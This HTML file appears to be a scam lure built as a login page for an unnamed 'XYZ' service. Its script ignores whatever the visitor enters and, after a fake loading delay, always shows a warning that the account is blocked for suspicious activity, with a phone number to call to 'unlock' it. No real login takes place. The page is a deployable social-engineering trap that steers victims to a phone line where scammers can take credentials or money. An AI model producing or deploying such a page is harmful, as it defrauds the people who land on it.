<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family: Arial, sans-serif;
        background-color: #f0f2f5;
        display: flex;
        justify-content: center;
        height: 100vh;
      }

      .login-wrapper {
        text-align: center;
        margin-top: 2rem;
      }

      .logo {
        width: 300px;
        margin: 1.5rem 0;
      }

      .login-container {
        background-color: white;
        padding: 30px;
        width: 400px;
        border-radius: 10px;
        box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.1);
        text-align: center;
      }

      h2 {
        margin-bottom: 20px;
        font-size: 18px;
        font-weight: 500;
        color: #333;
      }

      input[type="text"],
      input[type="password"] {
        width: 100%;
        padding: 15px;
        margin-bottom: 15px;
        border: 1px solid #ddd;
        border-radius: 5px;
        font-size: 16px;
      }

      .login-btn {
        width: 100%;
        padding: 15px;
        background-color: #404e57;
        color: white;
        border: none;
        border-radius: 5px;
        font-size: 20px;
        font-weight: 700;
        cursor: pointer;
      }

      .login-btn:hover {
        background-color: #2d373d;
      }

      .extra-options {
        margin-top: 15px;
        font-size: 14px;
      }

      .extra-options a {
        text-decoration: none;
        color: #006de3;
      }

      .extra-options a:hover {
        text-decoration: underline;
      }
      .login-btn.loading {
        position: relative;
        pointer-events: none;
        opacity: 0.7;
      }
      .login-btn.loading::after {
        content: "";
        position: absolute;
        right: 110px;
        width: 15px;
        height: 15px;
        border: 2px solid #fff;
        border-top: 2px solid #333;
        border-radius: 50%;
        animation: spin 0.6s linear infinite;
      }
      @keyframes spin {
        from {
          transform: rotate(0deg);
        }
        to {
          transform: rotate(360deg);
        }
      }
    </style>
  </head>
  <body>
    <div class="login-wrapper">
      <img src="logo.svg" alt="XYZ Logo" class="logo" />
      <div class="login-container">
        <h2>Log in to continue</h2>
        <form id="login-form">
          <input type="text" placeholder="Username" required />
          <input type="password" placeholder="Password" required />
          <button type="submit" class="login-btn">
            Log in
            <img
              id="loader"
              src="loader.gif"
              alt="Loading..."
              style="display: none; width: 20px; margin-left: 10px"
            />
          </button>
          <div
            id="error-message"
            style="
              color: #a94442;
              background-color: #f2dede;
              border: 1px solid #ebccd1;
              padding: 10px;
              margin-top: 8px;
              text-align: center;
              border-radius: 4px;
              display: none;
            "
          >
            Yours Account access has been blocked due to suspicious login
            attempt. Contact our customer support at
            <a
              href="tel:+18089603503"
              style="color: blue; text-decoration: underline"
              >+1 808 960 3503</a
            >.to verify and unlock your account.
          </div>
        </form>

        <div class="extra-options">
          <a href="#">Forgotten account?</a> Â·
          <a href="#">Sign up ?</a>
        </div>
      </div>
    </div>
    <script>
      document
        .getElementById("login-form")
        .addEventListener("submit", function (event) {
          event.preventDefault();

          const submitButton = document.querySelector(".login-btn");
          submitButton.classList.add("loading");

          setTimeout(function () {
            submitButton.classList.remove("loading");
            document.getElementById("error-message").style.display = "block";
          }, 1500);
        });
    </script>
  </body>
</html>
